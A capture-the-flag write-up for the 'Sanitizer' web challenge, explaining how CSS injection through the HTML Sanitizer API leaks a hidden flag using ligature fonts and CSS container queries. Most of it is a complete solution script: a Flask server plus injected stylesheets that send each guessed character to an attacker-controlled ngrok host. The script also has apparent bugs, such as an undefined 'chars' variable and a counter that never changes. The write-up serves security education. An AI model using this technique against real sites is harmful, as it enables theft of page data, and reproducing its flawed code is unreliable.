# Sanitizer (Web)
> What does it truly mean to sanitize something? What is a sanitize? Is this challenge solvable?
> Admin bot code is provided, running Chromium at least 109.0

The challenge is to leak the contents of a page given content injection passed through the new [HTML Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API).

```html
<!DOCTYPE html>
<html>
    <body>
        <div id="flag"></div>
        <div id="target"></div>
        <script>
            const flag = window.localStorage["flag"] || "irisctf{REDACTED_redacted_R3d4cT3d}";
            console.assert(flag.length == 35);
            document.getElementById("flag").innerText = flag;
            const inp = decodeURIComponent(location.search.substr(1));
            document.getElementById("target").setHTML(inp);
        </script>
    </body>
</html>
```

The Sanitizer API does **not** block injecting stylesheet elements, so you can use style injection techniques to leak the flag. There is no CSP that prevents you from using external stylesheets or connections.

The standard techniques for doing this is due to [Michał Bentkowski](https://research.securitum.com/stealing-data-in-great-style-how-to-use-css-to-attack-web-application/), who showed that by creating a font that makes all characters besides the target ligature have a width of 0 one can make the target element have a large size _only_ if it contains a desired substring, and then use a side channel to trigger an URL load only in that case.

The admin bot also runs with a few extra arguments:
```js
const puppeter_args = {"args": [
    '--no-sandbox',
    `--window-size=1920,1080`,
    '--window-position=0,0',
    '--hide-scrollbars',
    '--disable-background-timer-throttling',
    '--disable-renderer-backgrounding'], headless: true};
```

`--hide-scrollbars` is implied by turning on headless mode, but it's actually provided again as a hint that the challenge cannot be solved using scrollbars, which is the technique every published style injection content leak I could uses as a side channel. So the other part of the challenge is coming up with some other way to trigger a content load exclusively when the CSS is matching.

I came up with a solution using the (also new) [CSS Container Queries](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Container_Queries). The size query directly lets you only apply a style when the size of an element fits a restriction. The only gotcha is that it can't query its own size - because then you might have an infinite loop where a style change triggers a style change triggers a style change and so on.
```css
#flag { font-family: "hack{n}"; background-color: red }
@container (width < 50px) {
    span {
        background: url({base}/ack?n={n}&p={p});
    }       
}
body:has(#flag) {
    display: flex;
    width: 500px;
}
#target {
    container-type: size;
    display: block;
    width: 100%;
}
```

Note that you also may have to work around having a maximum width for glyphs in the font. The flag is decently long which means that the flag, when rendered with a default font (while the custom font is still loading) could end up being larger than a single glyph. I had to work around this by specifying a ligature for the `iris` part of the flag.

The challenge does not prevent framing so you do not have to use recursive CSS imports and the cookie is localStorage so you don't have to `window.open` the page, which would hopefully cut down on waiting for the bot to run your exploit and entering PoWs.

My solution script is at the bottom of the page, which leaks about 25 characters per run. You will need to get the `generate_font` code from this writeup of of `flag-sharer` of [redpwn CTF 2020](https://git.lain.faith/BLAHAJ/redpwn-flag-sharer), and add a `<glyph unicode="{first_known_part}" horiz-adv-x="80000" d="M1 0z"/>` glyph to the font.

```
irisctf{C0nt41n3r_Qu3r13s_4r3_N3at}
```

```py
import subprocess
import tempfile
import os
import base64
from flask import Flask, request, make_response
import threading
cv = threading.Condition()

app = Flask(__name__)
BF_CHARSET = list("abcdefghijklmnopqrstuvxyzABCDEFGIHJKLMNOPQRSTUVWXYZ0123456789_{}")
KNOWN = "iris" # put first part of chars as width padding
KNOWN_2 = "ctf{"

FONT_CTR = 0
def generate_font(_):
    assert False, "please get the generate_font function from its source"

def generate_fonts(prefix):
    css = []
    charmap = {}
    for c in BF_CHARSET:
        font, font_name = generate_font(prefix + c)
        css.append(font)
        chars[font_name] = prefix + c
    return css, chars

state = {"prefix": KNOWN_2, "ready": True, "fonts": [], "map": {}}

@app.route("/job")
def job():
    with cv:
        while state["ready"] == False:
            cv.wait()
        state["ready"] = False

    if state["prefix"][-1] == "}":
        print("==== DONE")
        print(KNOWN + state["prefix"])
        return {"done": 1}
    # Generate new job
    fonts, m = generate_fonts(state["prefix"])
    state["fonts"] = fonts
    state["map"] = m

    return {"p": len(state["prefix"]), "n": len(BF_CHARSET), "done": 0}

BASE_CSS = """{font}
#flag { font-family: "hack{n}"; background-color: red }
@container (width < 50px) {
    span {
        background: url({base}/ack?n={n}&p={p});
    }       
}
body:has(#flag) {
    display: flex;
    width: 500px;
}
#target {
    container-type: size;
    display: block;
    width: 100%;
}
"""
NGROK = input("base: ")

@app.route("/sanitizer.css")
def css():
    n = request.args.get("n")
    p = request.args.get("p")
    t = BASE_CSS.replace("{n}",str(FONT_CTR - len(BF_CHARSET) + int(n))).replace("{p}",p).replace("{base}",NGROK).replace("{font}", state["fonts"][int(n)])
    r = make_response(t)
    r.headers["Content-Type"] = "text/css"
    return r

@app.route("/ack")
def ack():
    n = request.args.get("n")
    p = request.args.get("p")
    if int(p) != len(state["prefix"]):
        return ""
    
    state["prefix"] = state["map"]["hack" + n]
    print("Prefix", KNOWN + state["prefix"])
    state["ready"] = True
    with cv:
        cv.notify()
    return "OK"

@app.route("/index.html")
def index():
    return """
<!DOCTYPE html><html><body><div id="c"> </div><script>
base = "{REMOTE}";
const c = document.getElementById("c");
let els = [];
async function go() {
    while(1) {
        const job = await fetch("job").then(d => d.json());
        if(job["done"]) return;
        c.innerHTML = "";
        for(let i = 0; i < job["n"]; i++) {
            let el = document.createElement("iframe");
            el.style = "max-width: 20px; max-height: 2px;";
            el.src = base + `<link%20rel="stylesheet"%20href="{NGROK}/sanitizer.css?n=${i}&p=${job['p']}"%20/><span>a</span>`;
            c.appendChild(el);
        }
    }
}
go();
</script></body></html>
""".replace("{NGROK}", NGROK).replace("{REMOTE}", "https://sanitizer-web.chal.irisc.tf/?")

@app.after_request
def acao(r):
    r.headers["Access-Control-Allow-Origin"] = "*"
    return r

app.run(port=12345)
```
